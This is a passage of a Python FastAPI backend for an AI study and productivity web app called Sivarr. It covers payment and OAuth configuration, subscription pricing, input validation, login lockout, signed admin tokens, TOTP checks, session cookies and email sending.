"""
Sivarr AI Web App — FastAPI Backend v4.2
Added: Rate limiting, Input validation, Error logging
"""

import csv
import datetime
import hashlib
import hmac
import io
import zipfile
import bcrypt
import json
import logging
import os
import random
import re
import secrets
import shutil
import html
import threading
import time
import traceback
import uuid
import warnings
from pathlib import Path
from typing import Callable

warnings.filterwarnings("ignore")

from fastapi import FastAPI, HTTPException, Request, UploadFile, File, Form, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, Response, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, validator

# ── Jinja2 template engine ──
from jinja2 import Environment, FileSystemLoader, select_autoescape

# GEMINI_AVAILABLE now lives in ai_core.py (imported further down, alongside
# the rest of the AI infra re-exports).

try:
    import stripe as _stripe
    _stripe.api_key = os.environ.get("STRIPE_SECRET_KEY", "")
    STRIPE_AVAILABLE = bool(_stripe.api_key)
    stripe = _stripe
except ImportError:
    STRIPE_AVAILABLE = False
    stripe = None

try:
    import httpx as _httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False
    _httpx = None

try:
    import resend as _resend
    RESEND_AVAILABLE = True
except ImportError:
    RESEND_AVAILABLE = False
    _resend = None

try:
    from pywebpush import webpush as _webpush, WebPushException
    WEBPUSH_AVAILABLE = True
except ImportError:
    WEBPUSH_AVAILABLE = False
    _webpush = None
    WebPushException = Exception

try:
    import sentry_sdk
    from sentry_sdk.integrations.starlette import StarletteIntegration
    from sentry_sdk.integrations.fastapi import FastApiIntegration
    SENTRY_AVAILABLE = True
except ImportError:
    SENTRY_AVAILABLE = False

import database as db
import rcache  # optional Redis layer (rate limiting + shared cache); degrades gracefully
import asyncio, json, time
from collections import defaultdict

# Real-time chat + announcements are delivered by DB-polling SSE streams
# (/api/org/chat/stream, /api/group/chat/stream), which work across all Gunicorn
# workers. The old in-memory per-org broadcast queue was process-local and so only
# reached clients on the same worker — it has been removed.

# ── Presence: last-seen per user per org (in-memory) ─────────
_PRESENCE: dict[str, dict] = defaultdict(dict)  # org_id → {sid: {name, ts}}

# ── Default org channels ──────────────────────────────────────
DEFAULT_CHANNELS = [
    {"id": "general",     "name": "general",     "desc": "Team-wide announcements"},
    {"id": "engineering", "name": "engineering", "desc": "Engineering discussions"},
    {"id": "product",     "name": "product",     "desc": "Product and design"},
    {"id": "sales",       "name": "sales",       "desc": "Sales and growth"},
    {"id": "design",      "name": "design",      "desc": "Design assets and feedback"},
    {"id": "random",      "name": "random",      "desc": "Off-topic conversations"},
]

# ═══════════════════════════════════════════════════════════════
#  LOGGING SETUP
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(),
    ]
)
log = logging.getLogger("sivarr")

# ═══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════

# VERSION now lives in core.py (imported at the top of this file).
# CACHE_EXPIRY now lives in ai_core.py.
HISTORY_LIMIT = 40
BANK_LIMIT    = 20

# Shared leaf-level primitives live in core.py so routes/*.py can import them
# without importing this partially-loaded module. See core.py's module docstring.
# These names are re-exported here unchanged — every existing reference in this
# file keeps working, and _session_tokens is the same dict object core.py mutates.
from core import (
    VERSION, DATA_DIR, UPLOADS_DIR, SHARES_DIR, LOG_DIR,
    MAX_MESSAGE_LEN, SESSION_TTL_DAYS,
    sanitize_text, validate_sid, save_json, _load_json_file, _save_json_file,
    _session_tokens, create_session_token, create_session_token_for_existing,
    delete_all_sessions, get_session_from_token, delete_session_token,
    _req_token, _resolve_token,
    RATE_LIMIT_WINDOW, limiter, get_client_key, check_rate_limit,
    asset, sw_cache_version,
)

for d in [DATA_DIR, UPLOADS_DIR, SHARES_DIR, LOG_DIR]:
    d.mkdir(parents=True, exist_ok=True)

ADMIN_PASSWORD     = os.environ.get("ADMIN_PASSWORD", "")
LECTURER_PASSWORD  = os.environ.get("LECTURER_PASSWORD", "")
# P4: optional TOTP 2FA on admin login. When set (base32 secret), admin login
# requires a valid 6-digit authenticator code in addition to ADMIN_PASSWORD.
# Unset = backward-compatible password-only login. Generate via
# scripts/admin_totp_setup.py.
ADMIN_TOTP_SECRET  = os.environ.get("ADMIN_TOTP_SECRET", "").strip().replace(" ", "")
# P4b: same optional TOTP 2FA for the (shared) lecturer login. Unset = password-only.
LECTURER_TOTP_SECRET = os.environ.get("LECTURER_TOTP_SECRET", "").strip().replace(" ", "")
if not ADMIN_PASSWORD:
    import sys
    print("CRITICAL: ADMIN_PASSWORD env var is not set. Admin login is disabled.", file=sys.stderr)
if not LECTURER_PASSWORD:
    import sys
    print("CRITICAL: LECTURER_PASSWORD env var is not set. Lecturer login is disabled.", file=sys.stderr)
BASE_URL           = os.environ.get("BASE_URL", "https://sivarr.up.railway.app")
RESEND_API_KEY     = os.environ.get("RESEND_API_KEY", "")
RESEND_FROM        = os.environ.get("RESEND_FROM_EMAIL", "Sivarr <noreply@sivarr.com>")
RESEND_REPLY_TO    = os.environ.get("RESEND_REPLY_TO", "Connectsivarr@gmail.com")
GMAIL_USER         = os.environ.get("GMAIL_USER", "")
GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD", "")
CRON_SECRET        = os.environ.get("CRON_SECRET", "")
VAPID_PRIVATE_KEY  = os.environ.get("VAPID_PRIVATE_KEY", "")
VAPID_PUBLIC_KEY   = os.environ.get("VAPID_PUBLIC_KEY", "")
VAPID_EMAIL        = os.environ.get("VAPID_EMAIL", "mailto:connectsivarr@gmail.com")
STRIPE_WEBHOOK_SECRET = os.environ.get("STRIPE_WEBHOOK_SECRET", "")

# ── Paystack (NGN payments) ───────────────────────────────────
PAYSTACK_SECRET_KEY = os.environ.get("PAYSTACK_SECRET_KEY", "")
PAYSTACK_PUBLIC_KEY = os.environ.get("PAYSTACK_PUBLIC_KEY", "")
PAYSTACK_AVAILABLE  = bool(PAYSTACK_SECRET_KEY)
NAIRA_RATE          = int(os.environ.get("NAIRA_RATE", "1650"))  # USD→NGN default (team-overridable at runtime)
PAYSTACK_API        = "https://api.paystack.co"

# ── Flutterwave (NGN/GHS/KES payments) ───────────────────────
FLUTTERWAVE_SECRET_KEY  = os.environ.get("FLUTTERWAVE_SECRET_KEY", "")
FLUTTERWAVE_PUBLIC_KEY  = os.environ.get("FLUTTERWAVE_PUBLIC_KEY", "")
FLUTTERWAVE_AVAILABLE   = bool(FLUTTERWAVE_SECRET_KEY)
FLUTTERWAVE_API         = "https://api.flutterwave.com/v3"

# ── Mono (African open banking) ──────────────────────────────
MONO_SECRET_KEY   = os.environ.get("MONO_SECRET_KEY", "")
MONO_PUBLIC_KEY   = os.environ.get("MONO_PUBLIC_KEY", "")
MONO_AVAILABLE    = bool(MONO_SECRET_KEY)
MONO_API          = "https://api.withmono.com"

# ── MetaApi (MetaTrader MT4/MT5 bridge) ──────────────────────
# MetaTrader has no direct retail REST API; MetaApi.cloud bridges to a user's
# broker account. We only pass the broker password to MetaApi at provisioning
# time (MetaApi stores it) — we never persist it ourselves. We keep the returned
# MetaApi account id + region for read-only balance/positions/history pulls.
METAAPI_TOKEN     = os.environ.get("METAAPI_TOKEN", "")
METAAPI_AVAILABLE = bool(METAAPI_TOKEN)
METAAPI_REGION    = os.environ.get("METAAPI_REGION", "new-york")  # default deploy region
METAAPI_PROVISION = "https://mt-provisioning-api-v1.agiliumtrade.ai"
def _metaapi_client_host(region: str) -> str:
    return f"https://mt-client-api-v1.{region or METAAPI_REGION}.agiliumtrade.ai"

# ── Google OAuth + Calendar ───────────────────────────────────
GOOGLE_CLIENT_ID       = os.environ.get("GOOGLE_CLIENT_ID", "")
GOOGLE_CLIENT_SECRET   = os.environ.get("GOOGLE_CLIENT_SECRET", "")
GOOGLE_OAUTH_AVAILABLE = bool(GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET)
GOOGLE_AUTH_URL        = "https://accounts.google.com/o/oauth2/v2/auth"
GOOGLE_TOKEN_URL       = "https://oauth2.googleapis.com/token"
GOOGLE_USERINFO_URL    = "https://www.googleapis.com/oauth2/v2/userinfo"
GOOGLE_CAL_API         = "https://www.googleapis.com/calendar/v3"

# ── GitHub OAuth ──────────────────────────────────────────────
GITHUB_CLIENT_ID       = os.environ.get("GITHUB_CLIENT_ID", "")
GITHUB_CLIENT_SECRET   = os.environ.get("GITHUB_CLIENT_SECRET", "")
GITHUB_OAUTH_AVAILABLE = bool(GITHUB_CLIENT_ID and GITHUB_CLIENT_SECRET)
GITHUB_AUTH_URL        = "https://github.com/login/oauth/authorize"
GITHUB_TOKEN_URL       = "https://github.com/login/oauth/access_token"
GITHUB_API             = "https://api.github.com"

# ── Sivarr Subscription Plans ─────────────────────────────────
# USD is the pricing anchor (see docs/PRICING_USD_RESTRUCTURE.md). The NGN amount
# charged via Paystack/Flutterwave is derived live from the team-set rate at
# checkout time via plan_charge_ngn(); no NGN is hard-coded here.
SIVARR_PLANS = {
    # ── Personal Space ──
    "pro_monthly":          {"name": "Pro",          "label": "Monthly",  "amount_usd": 12,   "period": "monthly", "space": "personal"},
    "pro_yearly":           {"name": "Pro",          "label": "Yearly",   "amount_usd": 108,  "period": "yearly",  "space": "personal"},
    "creator_monthly":      {"name": "Creator",      "label": "Monthly",  "amount_usd": 22,   "period": "monthly", "space": "personal"},
    "creator_yearly":       {"name": "Creator",      "label": "Yearly",   "amount_usd": 198,  "period": "yearly",  "space": "personal"},
    # Founding-100 ($6/mo for life) — opens fresh at launch, hidden from the public catalog until then.
    "founding_monthly":     {"name": "Pro",          "label": "Founding", "amount_usd": 6,    "period": "monthly", "space": "personal", "cohort": "founding_100", "hidden": True},
    # ── Academic Space ──
    "student_pro_monthly":  {"name": "Student Pro",  "label": "Monthly",  "amount_usd": 4.99, "period": "monthly", "space": "academic"},
    "student_pro_yearly":   {"name": "Student Pro",  "label": "Yearly",   "amount_usd": 35,   "period": "yearly",  "space": "academic"},
    "educator_pro_monthly": {"name": "Educator Pro", "label": "Monthly",  "amount_usd": 12,   "period": "monthly", "space": "academic"},
    "educator_pro_yearly":  {"name": "Educator Pro", "label": "Yearly",   "amount_usd": 108,  "period": "yearly",  "space": "academic"},
    # ── Organisation Space (interim flat plan; per-seat billing is Phase 2) ──
    "team_monthly":         {"name": "Team",         "label": "Monthly",  "amount_usd": 10,   "period": "monthly", "space": "org"},
}

BILLING_CONFIG_PATH = DATA_DIR / "billing_config.json"
_naira_rate_cache = {"val": None, "ts": 0.0}

def get_naira_rate() -> int:
    """Live USD→NGN rate. An admin override wins over the NAIRA_RATE env default,
    so the team can change it without a redeploy. Stored in the DB when available
    (durable across redeploys) and falls back to billing_config.json locally.
    Cached 30s per worker (FX moves slowly; billing locks the charged NGN at init)."""
    now = time.time()
    if _naira_rate_cache["val"] is not None and now - _naira_rate_cache["ts"] < 30:
        return _naira_rate_cache["val"]
    rate = NAIRA_RATE
    try:
        if db.is_available():
            v = db.get_config("naira_rate")
            if v and int(v) > 0:
                rate = int(v)
        elif BILLING_CONFIG_PATH.exists():
            r = int(json.loads(BILLING_CONFIG_PATH.read_text(encoding="utf-8")).get("naira_rate") or 0)
            if r > 0:
                rate = r
    except Exception:
        pass
    _naira_rate_cache["val"] = rate
    _naira_rate_cache["ts"]  = now
    return rate

def set_naira_rate(rate: int) -> None:
    """Persist a team-set USD→NGN rate (admin only). DB when available (durable),
    else a local file."""
    rate = int(rate)
    stored = False
    try:
        if db.is_available():
            stored = db.set_config("naira_rate", str(rate))
    except Exception as exc:
        log.error(f"set_naira_rate DB write failed: {exc}")
    if not stored:
        try:
            BILLING_CONFIG_PATH.write_text(json.dumps({"naira_rate": rate}), encoding="utf-8")
        except Exception as exc:
            log.error(f"set_naira_rate file write failed: {exc}")
    _naira_rate_cache["val"] = rate
    _naira_rate_cache["ts"]  = time.time()

def plan_charge_ngn(plan: dict, seats: int = 1) -> int:
    """USD-anchored plan → whole-NGN charge for the gateway, at the live rate."""
    if not plan:
        return 0
    usd = plan.get("amount_usd", 0) * (seats if plan.get("per_seat") else 1)
    return int(round(usd * get_naira_rate()))

# ── Organisation per-seat pricing (Phase 2b) ───────────────────────
ORG_SEAT_USD_MONTHLY = int(os.environ.get("ORG_SEAT_USD_MONTHLY", 10))
ORG_SEAT_USD_YEARLY  = int(os.environ.get("ORG_SEAT_USD_YEARLY", 96))
ORG_SELFSERVE_MAX    = 50   # 51+ seats = custom enterprise (not self-serve)

def org_seat_total_usd(seats: int, period: str = "monthly"):
    """Total USD for an org seat subscription, including the 11–50 seat discount
    (−10%). Returns None for 51+ seats (custom enterprise — not self-serve)."""
    seats = max(1, int(seats or 1))
    if seats > ORG_SELFSERVE_MAX:
        return None
    per   = ORG_SEAT_USD_YEARLY if period == "yearly" else ORG_SEAT_USD_MONTHLY
    total = seats * per
    if 11 <= seats <= 50:
        total *= 0.9
    return round(total, 2)

def org_seat_quote(seats: int, period: str = "monthly") -> dict:
    """Price breakdown for `seats` at `period`, with the live NGN conversion."""
    total_usd = org_seat_total_usd(seats, period)
    if total_usd is None:
        return {"seats": seats, "period": period, "custom": True}
    rate = get_naira_rate()
    ngn  = int(round(total_usd * rate))
    per  = ORG_SEAT_USD_YEARLY if period == "yearly" else ORG_SEAT_USD_MONTHLY
    return {
        "seats": seats, "period": period, "custom": False,
        "per_seat_usd": per, "discount": (10 if 11 <= seats <= 50 else 0),
        "total_usd": total_usd, "display_usd": ("$%g" % total_usd),
        "fx": {"currency": "NGN", "rate": rate, "amount_ngn": ngn,
               "display_local": f"≈ ₦{ngn:,}"},
    }

# ── Sentry ────────────────────────────────────────────────────
SENTRY_DSN = os.environ.get("SENTRY_DSN", "")

# ── Analytics ─────────────────────────────────────────────────
PLAUSIBLE_DOMAIN = os.environ.get("PLAUSIBLE_DOMAIN", "")

# ── Shared file paths (defined early so all functions can use them) ──
ANN_PATH          = DATA_DIR / "announcements.json"
TOPICS_PATH       = DATA_DIR / "class_topics.json"
EXAMS_PATH        = DATA_DIR / "exams.json"
CLASSES_PATH      = DATA_DIR / "classes.json"
USERS_PATH        = DATA_DIR / "users.json"
COMMUNITY_PATH    = DATA_DIR / "community_posts.json"
OPPORTUNITIES_PATH = DATA_DIR / "opportunities.json"

def load_users() -> dict:
    """Load users from JSON file (DB is used directly per-user in login flow)."""
    if USERS_PATH.exists():
        try:
            return json.loads(USERS_PATH.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}


def save_users(users: dict):
    """Save users to JSON file and sync to DB."""
    tmp = str(USERS_PATH) + f".{os.getpid()}.{uuid.uuid4().hex[:8]}.tmp"
    with open(tmp, "w") as f:
        json.dump(users, f, indent=2)
    shutil.move(tmp, str(USERS_PATH))
    # Sync to DB — create new rows, update existing ones
    if db.is_available():
        for sid, u in users.items():
            try:
                if db.user_exists(sid):
                    db.update_user(u)
                else:
                    db.create_user(u)
            except Exception as e:
                log.warning(f"DB sync user {sid}: {e}")

# ── Rate limiting config ──────────────────────────────────────
# RATE_LIMIT_CHAT now lives in routes/ai_chat.py, the only place that uses it.
FREE_DAILY_CHAT     = int(os.environ.get("FREE_DAILY_CHAT", 15))      # free-tier AI messages per day (server-enforced)
AI_DAILY_FREE       = int(os.environ.get("AI_DAILY_FREE", 40))        # free-tier non-chat AI actions per day (study/write/review/etc.)
# Paid-tier daily AI fair-use ceilings — high enough to feel unlimited for real
# use, but finite so one account can't run up a massive Gemini bill. Env-tunable.
STUDENT_DAILY_CHAT  = int(os.environ.get("STUDENT_DAILY_CHAT", 150))
STUDENT_DAILY_AI    = int(os.environ.get("STUDENT_DAILY_AI", 250))
PRO_DAILY_CHAT      = int(os.environ.get("PRO_DAILY_CHAT", 250))
PRO_DAILY_AI        = int(os.environ.get("PRO_DAILY_AI", 400))
CREATOR_DAILY_CHAT  = int(os.environ.get("CREATOR_DAILY_CHAT", 600))
CREATOR_DAILY_AI    = int(os.environ.get("CREATOR_DAILY_AI", 800))
RATE_LIMIT_QUIZ     = int(os.environ.get("RATE_LIMIT_QUIZ", 5))      # max quiz questions per window
RATE_LIMIT_UPLOAD   = int(os.environ.get("RATE_LIMIT_UPLOAD", 5))     # max uploads per window
# RATE_LIMIT_WINDOW now lives in core.py (imported at the top of this file).
RATE_LIMIT_LOGIN    = int(os.environ.get("RATE_LIMIT_LOGIN", 10))     # max login attempts per window
RATE_LIMIT_VERIFY   = int(os.environ.get("RATE_LIMIT_VERIFY", 3))      # max verify-email resends per window

# ── Input validation config ───────────────────────────────────
# MAX_MESSAGE_LEN now lives in core.py (imported at the top of this file).
MAX_NAME_LEN     = 80      # max student name length
MAX_MATRIC_LEN   = 30      # max matric number length
MAX_FILE_SIZE    = 5 * 1024 * 1024  # 5MB max file size

# GEMINI_MODELS/MATH_TRIGGERS/UNCERTAINTY_PHRASES/TOPIC_STRIP/SYSTEM_PROMPT/
# MATH_PROMPT now live in ai_core.py.

# QUIZ_PROMPT now lives in routes/quiz.py.

SUGGESTION_PROMPT = """You are Sivarr study advisor.
Student: {name} | Studied: {topics} | Weakest: {weak} | Quiz: {quiz_summary} | Difficulty: {difficulty}
Recommend exactly 3 specific topics. Numbered list, one sentence each. Be encouraging.
Never use em dashes. Use commas or periods instead."""

FILE_SUMMARY_PROMPT = """A student uploaded a document. Here is the extracted text:

{text}

Please:
1. Give a brief summary (3-5 sentences)
2. List 5 key topics or concepts from the document
3. Suggest 3 quiz questions based on the content

Format clearly with headers. Never use em dashes. Use commas or periods instead."""

# FILE_QUIZ_PROMPT now lives in routes/quiz.py.

# RateLimiter/limiter/check_rate_limit/get_client_key now live in core.py
# (imported at the top of this file).


# ═══════════════════════════════════════════════════════════════
#  INPUT VALIDATION
# ═══════════════════════════════════════════════════════════════

# sanitize_text now lives in core.py (imported at the top of this file).


# ── Auth input hardening (login/register) ───────────────────────────
_AUTH_TAG_RE   = re.compile(r"<[^>]*>")
_AUTH_EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
_AUTH_NAME_RE  = re.compile(r"^[a-zA-Z\s\-'.]+$")   # letters, spaces, - ' .
MAX_EMAIL_LEN    = 254     # RFC 5321 practical max
MAX_PASSWORD_LEN = 200     # bcrypt only hashes 72 bytes; cap to stop oversize-input DoS

def _strip_html(text: str) -> str:
    """Remove HTML/script tags and any stray angle brackets from a user-supplied
    string — defense-in-depth so no markup is ever stored or echoed back, on top
    of sanitize_text() (control-char/null/length) and per-field format checks."""
    if not text:
        return ""
    return _AUTH_TAG_RE.sub("", text).replace("<", "").replace(">", "")


# validate_sid now lives in core.py (imported at the top of this file).


def safe_path(base_dir: Path, filename: str) -> Path:
    """
    Return a safe path within base_dir, preventing path traversal.
    Raises HTTPException if the resolved path escapes base_dir.
    """
    # Sanitise filename
    safe_name = re.sub(r"[^a-zA-Z0-9_\-.]", "_", filename)
    full_path  = (base_dir / safe_name).resolve()
    # Ensure it stays within base_dir
    try:
        full_path.relative_to(base_dir.resolve())
    except ValueError:
        log.warning(f"Path traversal attempt: {filename}")
        raise HTTPException(400, "Invalid file path.")
    return full_path


def validate_name(name: str) -> str:
    """Validate and clean student name."""
    name = sanitize_text(name, MAX_NAME_LEN)
    if not name:
        raise HTTPException(400, "Name cannot be empty.")
    if len(name) < 2:
        raise HTTPException(400, "Name must be at least 2 characters.")
    # Allow letters, spaces, hyphens, apostrophes
    if not re.match(r"^[a-zA-Z\s\-'.]+$", name):
        raise HTTPException(400, "Name contains invalid characters.")
    return name


def validate_matric(matric: str) -> str:
    """Validate matric number format."""
    matric = sanitize_text(matric, MAX_MATRIC_LEN)
    if not matric:
        raise HTTPException(400, "Matric number cannot be empty.")
    if len(matric) < 3:
        raise HTTPException(400, "Matric number too short.")
    # Allow alphanumeric, slashes, hyphens
    if not re.match(r"^[a-zA-Z0-9\-/]+$", matric):
        raise HTTPException(400, "Matric number contains invalid characters.")
    return matric


def validate_message(msg: str) -> str:
    """Validate chat message."""
    msg = sanitize_text(msg, MAX_MESSAGE_LEN)
    if not msg:
        raise HTTPException(400, "Message cannot be empty.")
    return msg

# ═══════════════════════════════════════════════════════════════
#  ENV
# ═══════════════════════════════════════════════════════════════

def load_env():
    env = Path(".env")
    if not env.exists():
        return
    for line in env.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, _, v = line.partition("=")
        os.environ.setdefault(k.strip(), v.strip())

load_env()
# API_KEY/_model_name/_chat_sessions now live in ai_core.py.
# _session_tokens now lives in core.py (imported at the top of this file). It is
# the same dict object — the ~20 mutation sites below continue to work unchanged.
# Admin/lecturer sessions are now stateless HMAC tokens — no in-memory dicts needed
_failed_logins:     dict = {}   # email → {count, locked_until}

LOGIN_LOCK_ATTEMPTS = 10
LOGIN_LOCK_MINUTES  = 15


def _check_account_lockout(email: str) -> None:
    """Raise 429 if the account is currently locked out.
    Uses Redis when available (shared across all workers); falls back to the
    per-worker in-memory counter otherwise."""
    n = rcache.get_int(f"faillock:{email}")
    if n is not None:                       # Redis is the source of truth
        if n >= LOGIN_LOCK_ATTEMPTS:
            raise HTTPException(429, f"Account locked after too many failed attempts. Try again in {LOGIN_LOCK_MINUTES} minute(s).")
        return
    # ── In-memory fallback (no Redis) ──
    rec = _failed_logins.get(email)
    if not rec:
        return
    locked_until = rec.get("locked_until")
    if locked_until and datetime.datetime.utcnow() < locked_until:
        secs_left = int((locked_until - datetime.datetime.utcnow()).total_seconds())
        mins_left = max(1, (secs_left + 59) // 60)
        raise HTTPException(429, f"Account locked after too many failed attempts. Try again in {mins_left} minute(s).")
    if locked_until:
        _failed_logins.pop(email, None)


def _record_failed_login(email: str) -> None:
    n = rcache.bump(f"faillock:{email}", LOGIN_LOCK_MINUTES * 60)
    if n is not None:                       # counted in Redis (shared)
        if n >= LOGIN_LOCK_ATTEMPTS:
            log.warning(f"Account locked after {LOGIN_LOCK_ATTEMPTS} failed attempts: {email}")
        return
    # ── In-memory fallback (no Redis) ──
    rec = _failed_logins.setdefault(email, {"count": 0, "locked_until": None})
    rec["count"] += 1
    if rec["count"] >= LOGIN_LOCK_ATTEMPTS:
        rec["locked_until"] = datetime.datetime.utcnow() + datetime.timedelta(minutes=LOGIN_LOCK_MINUTES)
        log.warning(f"Account locked after {LOGIN_LOCK_ATTEMPTS} failed attempts: {email}")


def _clear_failed_login(email: str) -> None:
    rcache.clear(f"faillock:{email}")       # no-op when Redis unavailable
    _failed_logins.pop(email, None)

# Auth token lifetime. Env-configurable so the exposure window of a stolen token
# can be tightened without a code change. 30d is convenient but long for a money
# app — consider 7 (or lower) once session-restore UX is solid. Clamped to 1..90.
# SESSION_TTL_DAYS / SESSION_REVALIDATE_SECONDS now live in core.py (imported above).
                                   # (bounds how long a revoked session lingers per worker)
# P3b: httpOnly session cookie. Set on every token-issuing path and read by
# _BearerTokenMiddleware as a fallback, so SSE/EventSource (can't set headers)
# and cookie-only clients authenticate WITHOUT ?token= in the URL. Secure is
# disabled in local dev (http) so the cookie still works there.
SESSION_COOKIE    = "sivarr_session"
_COOKIE_SECURE    = os.environ.get("RAILWAY_ENVIRONMENT", "production") != "development"
# P3b step(d): __Host- prefix enforces Secure+Path=/+no-Domain at the browser level,
# preventing subdomain session-cookie hijacking. Only valid over HTTPS (Secure); falls
# back to the plain name in local HTTP dev where Secure is off.
_SESSION_COOKIE_KEY = f"__Host-{SESSION_COOKIE}" if _COOKIE_SECURE else SESSION_COOKIE
# CSRF double-submit cookie: non-httpOnly so JS can read + echo as X-CSRF-Token header.
# Belt-and-suspenders with SameSite=Lax; validated in _BearerTokenMiddleware.
_CSRF_COOKIE = "sivarr_csrf"
# _req_token / _resolve_token now live in core.py (imported at the top of this
# file). _BearerTokenMiddleware below does _req_token.set(...) on the same
# ContextVar object core.py's _resolve_token reads from.
# CHAT_SESSION_TTL now lives in ai_core.py.
_PRIV_SESSION_TTL_S = 7200  # 2 hours in seconds


def _hmac_sign(payload: str, secret: str) -> str:
    return hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()[:24]


def _create_admin_session() -> str:
    """Stateless HMAC-signed token — valid across all Gunicorn workers."""
    ts = str(int(time.time()))
    sig = _hmac_sign(f"admin:{ts}", ADMIN_PASSWORD or "unset")
    return f"adm_{ts}_{sig}"


def _is_valid_admin_session(token: str) -> bool:
    if not token or not token.startswith("adm_"):
        return False
    try:
        parts = token.split("_")
        ts, sig = int(parts[1]), parts[2]
    except (IndexError, ValueError):
        return False
    if time.time() - ts > _PRIV_SESSION_TTL_S:
        return False
    if rcache.is_revoked(token):
        return False
    expected = _hmac_sign(f"admin:{ts}", ADMIN_PASSWORD or "unset")
    return hmac.compare_digest(sig, expected)


def _revoke_priv_session(token: str, issued_ts: int) -> None:
    """Denylist an admin/lecturer token for whatever's left of its 2h lifetime."""
    remaining = _PRIV_SESSION_TTL_S - (int(time.time()) - issued_ts)
    if remaining > 0:
        rcache.revoke_token(token, remaining)


def _totp_verify(secret_b32: str, code: str, window: int = 1) -> bool:
    """RFC 6238 TOTP check — SHA1, 6 digits, 30s step. `window` tolerates ±N
    steps of clock drift between server and authenticator. Stdlib only (no
    pyotp dependency). Returns False on any malformed input."""
    import base64
    code = (code or "").strip().replace(" ", "")
    if not (secret_b32 and code.isdigit() and len(code) == 6):
        return False
    try:
        s = secret_b32.strip().replace(" ", "").upper()
        s += "=" * ((8 - len(s) % 8) % 8)   # restore base32 padding
        key = base64.b32decode(s)
        step = int(time.time()) // 30
        for off in range(-window, window + 1):
            counter = (step + off).to_bytes(8, "big")
            mac = hmac.new(key, counter, hashlib.sha1).digest()
            o = mac[-1] & 0x0F
            val = (int.from_bytes(mac[o:o + 4], "big") & 0x7FFFFFFF) % 1_000_000
            if hmac.compare_digest(f"{val:06d}", code):
                return True
    except Exception:
        return False
    return False


def _create_lecturer_session() -> str:
    """Stateless HMAC-signed token — valid across all Gunicorn workers."""
    ts = str(int(time.time()))
    sig = _hmac_sign(f"lec:{ts}", LECTURER_PASSWORD or "unset")
    return f"lec_{ts}_{sig}"


def _is_valid_lecturer_session(token: str) -> bool:
    if not token or not token.startswith("lec_"):
        return False
    try:
        parts = token.split("_")
        ts, sig = int(parts[1]), parts[2]
    except (IndexError, ValueError):
        return False
    if time.time() - ts > _PRIV_SESSION_TTL_S:
        return False
    if rcache.is_revoked(token):
        return False
    expected = _hmac_sign(f"lec:{ts}", LECTURER_PASSWORD or "unset")
    return hmac.compare_digest(sig, expected)




# ── Token-based session management ────────────────────────────────

# create_session_token / create_session_token_for_existing / delete_all_sessions /
# get_session_from_token / delete_session_token all now live in core.py (imported
# at the top of this file). The cookie helpers below stay here — they depend on
# FastAPI's Response and this module's cookie constants.


def _set_session_cookie(response: Response, token: str) -> None:
    """P3b: store the session token in an httpOnly+SameSite cookie. httpOnly
    keeps it out of reach of JS (XSS exfil); the cookie is auto-sent on
    same-origin requests incl. SSE/EventSource. Additive — the Bearer header
    and ?token= query param still work during the migration.
    Also sets the CSRF double-submit cookie (non-httpOnly, SameSite=Strict) so
    the JS fetch wrapper can read + echo it as X-CSRF-Token on every POST."""
    response.set_cookie(
        key=_SESSION_COOKIE_KEY, value=token,
        max_age=SESSION_TTL_DAYS * 86400,
        httponly=True, secure=_COOKIE_SECURE, samesite="lax", path="/",
    )
    response.set_cookie(
        key=_CSRF_COOKIE, value=secrets.token_urlsafe(24),
        max_age=SESSION_TTL_DAYS * 86400,
        httponly=False, secure=_COOKIE_SECURE, samesite="strict", path="/",
    )


def _clear_session_cookie(response: Response) -> None:
    response.delete_cookie(_SESSION_COOKIE_KEY, path="/", samesite="lax", secure=_COOKIE_SECURE)
    response.delete_cookie(_CSRF_COOKIE, path="/", samesite="strict", secure=_COOKIE_SECURE)


def _persist_password(sid: str, hashed: str) -> None:
    """Update a user's password in BOTH stores. login() reads the JSON user file
    first (load_users) and only falls back to the DB, so a DB-only update would
    leave the OLD password working after a reset/change. Keep them in sync."""
    if db.is_available():
        db.update_user_password(sid, hashed)
    try:
        users = load_users()
        if sid in users:
            users[sid]["password"] = hashed
            save_users(users)
    except Exception as exc:
        log.error(f"_persist_password file sync failed for {sid}: {exc}")


def _gmail_configured() -> bool:
    return bool(GMAIL_USER and GMAIL_APP_PASSWORD)


def _resend_configured() -> bool:
    return bool(RESEND_AVAILABLE and RESEND_API_KEY)


def send_email(to: str, subject: str, html_body: str) -> tuple[bool, str]:
    """Send a transactional email.

    Gmail SMTP is the primary provider when configured (no domain registration
    needed); Resend is the alternate. If the primary errors at send time (e.g.
    Resend rejecting an unverified sender domain), we fall through to the other
    provider when it's available, so a single misconfigured provider can't
    silently drop verification/reset email.
    """
    # Ordered list of (name, fn) providers that are actually configured.
    providers: list[tuple[str, Callable[[str, str, str], tuple[bool, str]]]] = []
    if _gmail_configured():
        providers.append(("gmail", _send_email_gmail))
    if _resend_configured():
        providers.append(("resend", _send_email_resend))

    if not providers:
        msg = "No email provider configured (set GMAIL_USER + GMAIL_APP_PASSWORD, or RESEND_API_KEY)"
        log.warning(f"Email skipped: '{subject}' → {to} | {msg}")
        return False, msg

    last_detail = ""
    for name, fn in providers:
        ok, detail = fn(to, subject, html_body)
        if ok:
            return True, "ok"
        last_detail = f"{name}: {detail}"
        log.warning(f"Email via {name} failed ('{subject}' → {to}): {detail} — trying next provider")
    return False, last_detail


def _send_email_resend(to: str, subject: str, html_body: str) -> tuple[bool, str]:
    """Send via Resend. Requires a verified sender domain (RESEND_FROM_EMAIL)."""
    try:
        _resend.api_key = RESEND_API_KEY
        _resend.Emails.send({
            "from":     RESEND_FROM,
            "to":       [to],
            "reply_to": [RESEND_REPLY_TO],
            "subject":  subject,
            "html":     html_body,
        })
